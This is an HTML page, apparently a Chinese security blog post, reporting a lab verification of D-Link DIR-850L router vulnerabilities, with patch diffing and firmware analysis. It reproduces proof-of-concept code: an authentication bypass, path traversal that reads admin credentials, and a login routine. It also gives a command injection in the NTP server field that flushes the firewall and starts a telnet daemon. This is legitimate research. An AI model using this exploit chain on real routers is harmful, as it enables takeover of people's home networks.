@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="zh"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8"><meta name="generator" content="Hugo 0.154.5"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><meta name="description" content="前言
+翻了一下笔记，看看有没有能贴出来的，发现这个已经过时了。这个笔记是当时花了一晚上做了一半，突然让我出差，另一个实习生搞不定于是不了了之了。现在也没有研究价值了，干脆贴出来吧。"><title>D-Link DIR 850L 路由器漏洞验证报告&nbsp;&ndash;&nbsp;Gorgias&#39; Blog</title><link rel="stylesheet" href="/css/core.min.363cdd0e3e6340dd0e88b1f21887fb7e53e3129ed31d7f3cf62686d06069621ece79dc5ffb48a77ebba54468e667212f.css" integrity="sha384-NjzdDj5jQN0OiLHyGIf7flPjEp7THX889iaG0GBpYh7Oedxf&#43;0infrulRGjmZyEv"><meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="D-Link DIR 850L 路由器漏洞验证报告" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/zh/"><span class="site name">Gorgias' Blog</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/zh/categories/">分类</a><a class="nav item" href="/zh/tags/">标签</a><a class="nav item" href="/zh/about/">关于</a><a class="nav item" href="/zh/links/">友链</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
+    <h1 class="article title">D-Link DIR 850L 路由器漏洞验证报告</h1><p class="article date">Thursday, June 22, 2017</p></section><article class="article markdown-body"><h2 id="前言">前言</h2>
+<p>翻了一下笔记，看看有没有能贴出来的，发现这个已经过时了。这个笔记是当时花了一晚上做了一半，突然让我出差，另一个实习生搞不定于是不了了之了。现在也没有研究价值了，干脆贴出来吧。</p>
+<blockquote>
+<p>CNVD在2017年8月10日发布了D-Link DIR系列由器身份验证信息泄露漏洞和远程命令执行漏洞（CNVD-2017-20002、CNVD-2017-20001）,根据知道创宇的验证情况，受漏洞影响的D-Link 路由器型号不限于官方厂商确认的DIR-850L型号，相关受影响的型号还包括DIR-868L、DIR-600、DIR-860L、DIR-815、DIR-890L、DIR-610L、DIR-822。相关利用代码已在互联网公开，受到影响的设备数量根据标定超过20万台，有可能会诱发大规模的网络攻击。</p>
+</blockquote>
+<p>我们采购了一个官方未确认但存在CNVD影响列表中的型号DIR-850L/B1，目的是验证漏洞公告的缺陷真实性。<br>
+并且下载了影响列表中其他型号的最新固件用于分析，目的是验证数据可靠性。</p>
+<h2 id="验证准备">验证准备</h2>
+<p>先模拟真实使用环境，配置上网参数，设置无线密码以及管理密码，注册MyDlink账户。<br>
+<img loading="lazy"  src="./configured.png"
+        alt="configured"/></p>
+<p>计划先验证当前版本2.06的漏洞，然后刷入最新固件并验证漏洞。<a href="http://support.dlink.com/ProductInfo.aspx?m=DIR-850L"target="_blank" rel="noopener noreferrer">DIR-850L/B1</a>官方最新固件版本是2.07B05，发布时间是02/21/17，可知官方没有为其打上补丁。<br>
+然后通过WAN测试是否能直接访问目标设备，结果显示当前设备无法直接通过WAN访问。<br>
+<img loading="lazy"  src="./port-scan.png"
+        alt="port-scan"/><br>
+除非手动开启远程管理才能通过WAN口的非80端口访问路由器
+<img loading="lazy"  src="./remote.png"
+        alt="remote"/></p>
+<h2 id="分析">分析</h2>
+<p>作者说明远程命令执行由两个漏洞组成，通过这个攻击组合可以执行任意命令。</p>
+<ul>
+<li>未认证用户可上传任意文件</li>
+<li>管理员用户可执行任意代码</li>
+</ul>
+<p>但是没有找到上传任意文件的证明</p>
+<h3 id="对比补丁">对比补丁</h3>
+<p><img loading="lazy"  src="./bcompare.png"
+        alt="bcompare"/><br>
+主要变化的可执行文件是cgibin，脚本文件是DEVICE.TIME.php和fatlady.php。<br>
+DEVICE.TIME.php加入了NTP服务器域名的验证，防止命令注入。<br>
+<img loading="lazy"  src="./device-time-patch.png"
+        alt="device-time-patch"/><br>
+fatlady.php加入了相对路径构造字符的过滤。<br>
+<img loading="lazy"  src="./fatlady-patch.png"
+        alt="fatlady-patch"/></p>
+<p>先分析DIR 850L/A的PoC和固件。作者的PoC证明了4处缺陷，并组合利用它们达到远程命令执行的目的。</p>
+<h3 id="未授权访问">未授权访问</h3>
+<p>未登录的用户可以直接访问CGI。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="s2">&#34;whatever&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><p>使用AUTHORIZED_GROUP&gt;=1的header也能绕过验证</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -d <span class="s2">&#34;SERVICES=DEVICE.ACCOUNT&amp;x=y&amp;AUTHORIZED_GROUP=1&#34;</span> <span class="s2">&#34;http://192.168.1.159:8080/getcfg.php&#34;</span>
+</span></span></code></pre></div><h3 id="管理员密码读取">管理员密码读取</h3>
+<p>构造xml，发送给/hedwig.cgi，然后读取里面的账号和密码。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;text/xml&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="s2">&#34;whatever&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;postxml&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;module&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;service&gt;../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml&lt;/service&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/module&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/postxml&gt;&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&#34;/hedwig.cgi&#34;</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">accdata</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;&lt;?xml&#34;</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl"><span class="n">admin_pasw</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">tree</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">accdata</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">accounts</span> <span class="o">=</span> <span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&#34;/module/device/account/entry&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">acc</span> <span class="ow">in</span> <span class="n">accounts</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">acc</span><span class="o">.</span><span class="n">findtext</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">pasw</span> <span class="o">=</span> <span class="n">acc</span><span class="o">.</span><span class="n">findtext</span><span class="p">(</span><span class="s2">&#34;password&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;name:&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;pass:&#34;</span><span class="p">,</span> <span class="n">pasw</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">name</span> <span class="o">==</span> <span class="s2">&#34;Admin&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">admin_pasw</span> <span class="o">=</span> <span class="n">pasw</span>
+</span></span></code></pre></div><h3 id="登录口令爆破">登录口令爆破</h3>
+<p>payload中加密的password可以自己构造，可暴力破解。在PoC里用于登录账户获得Cookie。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&#34;/authentication.cgi&#34;</span><span class="p">))</span>  
+</span></span><span class="line"><span class="cl"><span class="c1"># print(resp.text)  </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;status&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">!=</span> <span class="s2">&#34;ok&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Failed!&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;uid:&#34;</span><span class="p">,</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;uid&#34;</span><span class="p">])</span>  
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;challenge:&#34;</span><span class="p">,</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;challenge&#34;</span><span class="p">])</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;uid&#34;</span><span class="p">]})</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Auth login...&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">user_name</span> <span class="o">=</span> <span class="s2">&#34;Admin&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">user_pasw</span> <span class="o">=</span> <span class="n">admin_pasw</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="n">user_name</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">user_pasw</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="p">(</span><span class="n">user_name</span> <span class="o">+</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;challenge&#34;</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="s2">&#34;md5&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&#34;/authentication.cgi&#34;</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  
+</span></span></code></pre></div><h3 id="两处命令注入">两处命令注入</h3>
+<p>pigwidgeon.cgi和hedwig.cgi都存在命令注入，payload通过构造xml然后被POST过去。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;SERVICES&#34;</span><span class="p">:</span> <span class="s2">&#34;DEVICE.TIME&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&#34;/getcfg.php&#34;</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">tree</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&#34;//ntp/enable&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&#34;//ntp/server&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;metelesku; (&#34;</span> <span class="o">+</span> <span class="n">COMMAND</span> <span class="o">+</span> <span class="s2">&#34;) &amp; exit; &#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&#34;//ntp6/enable&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">tostring</span><span class="p">(</span><span class="n">tree</span><span class="p">)</span>  
+</span></span></code></pre></div><p>分析完PoC后，解包D-Link固件，然后分析文件。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">binwalk DIR850LA1_FW114b07WW.bin
+</span></span><span class="line"><span class="cl">dd <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="nv">skip</span><span class="o">=</span><span class="m">1638544</span> <span class="k">if</span><span class="o">=</span>DIR850LA1_FW114b07WW.bin <span class="nv">of</span><span class="o">=</span>DIR850LA1_FW114b07WW.squashfs
+</span></span><span class="line"><span class="cl">unsquashfs DIR850LA1_FW114b07WW.squashfs
+</span></span></code></pre></div><p>发现该目录下的CGI文件都是指向cgibin的符号链接<br>
+<img loading="lazy"  src="./files.png"
+        alt="files"/><br>
+web架构后端由PHP提供HNAP的WebService，前端异步请求。<br>
+分析用于解析PHP对应的可执行文件/htdocs/cgibin，从入口点跟进。<br>
+<img loading="lazy"  src="./main.png"
+        alt="main"/><br>
+通过argv[0]匹配相应的CGI，CGI再去执行PHP文件，如果没有匹配到则输出</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">CGI.BIN, unknown command argv[0]
+</span></span></code></pre></div><p><img loading="lazy"  src="./main1.png"
+        alt="main1"/><br>
+hedwigcgi_main把获取到的xml文本解析成参数，然后传递给/htdocs/webinc/fatlady.php。<br>
+<img loading="lazy"  src="./tofatlady.png"
+        alt="tofatlady"/></p>
+<p>关键在这三行，获取到service参数，让PHP加载文件。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$service</span> <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">&#34;service&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$target</span> <span class="o">=</span> <span class="s2">&#34;/htdocs/phplib/fatlady/&#34;</span><span class="o">.</span><span class="nv">$service</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isfile</span><span class="p">(</span><span class="nv">$target</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="nx">dophp</span><span class="p">(</span><span class="s2">&#34;load&#34;</span><span class="p">,</span> <span class="nv">$target</span><span class="p">);</span>
+</span></span></code></pre></div><p>通过构造目录，可以实现任意文件包含，达到输出敏感信息的目的。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/htdocs/phplib/fatlady/../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php
+</span></span></code></pre></div><p><img loading="lazy"  src="./getcfg.png"
+        alt="getcfg"/></p>
+<p>pigwidgeoncgi_main先验证session是否属于管理员，如果属于则把xml解析，并设ACTION参数值为SETCFG，然后传入/htdocs/webinc/wand.php<br>
+<img loading="lazy"  src="./session.png"
+        alt="session"/><br>
+<img loading="lazy"  src="./wand1.png"
+        alt="wand1"/><br>
+<img loading="lazy"  src="./wand2.png"
+        alt="wand2"/></p>
+<p>关键代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$svc</span> <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">&#34;service&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="s2">&#34;/htdocs/phplib/setcfg/&#34;</span><span class="o">.</span><span class="nv">$svc</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isfile</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="nx">dophp</span><span class="p">(</span><span class="s2">&#34;load&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span></code></pre></div><p>然后可以包含指定文件DEVICE.TIME</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">service</span> <span class="o">=</span> <span class="n">DEVICE</span><span class="o">.</span><span class="n">TIME</span>
+</span></span><span class="line"><span class="cl"><span class="n">server</span> <span class="o">=</span> <span class="n">metelesku</span><span class="p">;</span> <span class="p">(</span><span class="n">iptables</span> <span class="o">-</span><span class="n">F</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">X</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">nat</span> <span class="o">-</span><span class="n">F</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">nat</span> <span class="o">-</span><span class="n">X</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">mangle</span> <span class="o">-</span><span class="n">F</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">mangle</span> <span class="o">-</span><span class="n">X</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">P</span> <span class="n">INPUT</span> <span class="n">ACCEPT</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">P</span> <span class="n">FORWARD</span> <span class="n">ACCEPT</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">P</span> <span class="n">OUTPUT</span> <span class="n">ACCEPT</span><span class="p">;</span><span class="n">telnetd</span> <span class="o">-</span><span class="n">p</span> <span class="mi">23090</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">date</span><span class="p">)</span> <span class="o">&amp;</span><span class="p">;</span> <span class="n">exit</span><span class="p">;</span>
+</span></span></code></pre></div><h2 id="验证">验证</h2>
+<p>以上分析的是DIR 850L/A的1.14.B07固件。对DIR 850L/B运行PoC脚本之后，算是复现其中三个缺陷，只有部分cgi可以未授权访问，getcfg.php需要登陆后才能访问。<br>
+<img loading="lazy"  src="./401.png"
+        alt="401"/><br>
+没有管理员cookie的情况下，命令注入只有hedwig.cgi能显示OK，pigwidgeon显示no power。<br>
+<img loading="lazy"  src="./no-power.png"
+        alt="no-power"/><br>
+国行版固件authentication.cgi的登录链接变成了webfa_authentication.cgi
+验证未授权访问CGI<br>
+<img loading="lazy"  src="./access-cgi.png"
+        alt="access-cgi"/><br>
+验证本地文件包含读取用户名密码<br>
+<img loading="lazy"  src="./lfi.png"
+        alt="lfi"/><br>
+代码注入</p>
+<h2 id="分析dir-850lb">分析DIR 850L/B</h2>
+<p>因为通告没有指明设备版本以及固件版本，PoC的利用范围有限。我们暂时不确定DIR 850L/B是否真实存在其漏洞，需要分析850L/B固件。但是官网的固件加密了，不能直接分析。现在有两个办法，一个是获得ROOT权限把固件提出来，另一个是通过读取Flash芯片提取固件。</p>
+<p>这次还爆出来一个在局域网任意命令执行的漏洞，利用条件苛刻，系统以ROOT权限运行dnsmasq，它的守护进程会从DHCP服务器获得&quot;host-name&quot;参数拼接并执行，我们可以通过注入命令的方式获得ROOT权限。</p>
+<p><img loading="lazy"  src="./UART1.png"
+        alt="UART1"/><br>
+<img loading="lazy"  src="./UART2.png"
+        alt="UART2"/><br>
+提取固件的挂载分区</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">dd if=/dev/mtdblock/7 of=/var/tmp/storage/Generic_Ubuntu_C2EE4/mtdblock0.bin bs=8
+</span></span><span class="line"><span class="cl">unsquashfs mtdblock0.bin
+</span></span></code></pre></div><h3 id="todo-1">TODO 1</h3>
+<p>分析文件目录差异和程序差异并写出</p>
+<h2 id="全网扫描统计">全网扫描统计</h2>
+<h3 id="todo-0">TODO 0</h3>
+<p>使用Allseeing的全网扫描结果，通过脚本统计存在漏洞并能利用的路由器。</p>
+<h2 id="参考">参考</h2>
+<p><a href="https://blogs.securiteam.com/index.php/archives/3364"target="_blank" rel="noopener noreferrer">SSD Advisory</a></p>
+<p><a href="https://www.seebug.org/vuldb/ssvid-96333"target="_blank" rel="noopener noreferrer">Seebug</a></p>
+<p><a href="http://www.cnvd.org.cn/webinfo/show/4202"target="_blank" rel="noopener noreferrer">CNVD</a></p>
+</article><section class="article labels"><a class="category" href=/zh/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/>硬件安全</a><a class="tag" href=/zh/tags/d-link/>D-Link</a><a class="tag" href=/zh/tags/iot/>IoT</a><a class="tag" href=/zh/tags/%E6%BC%8F%E6%B4%9E/>漏洞</a></section>
+</div>
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/zh/posts/hackrf-gps-%E6%AC%BA%E9%AA%97/"><span class="iconfont icon-article"></span>HackRF GPS 欺骗笔记</a></p><p><a class="link" href="/zh/posts/cve-2017-0199-%E5%88%A9%E7%94%A8/"><span class="iconfont icon-article"></span>OFFICE OLE2LINK 漏洞 (CVE-2017-0199) 利用</a></p></section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">2015 - 2026 Gorgias' Blog. </p><p class="license">
+        <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">
+            <img alt="CC BY-NC-SA" loading="lazy" src="/images/by-nc.svg" style="vertical-align: middle; height: 1.2em; margin: 0 0.2em;" />
+            CC BY-NC-SA 4.0
+        </a>
+        (署名-非商业性使用-相同方式共享).
+    </p><p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div></section></body>
+
+</html>
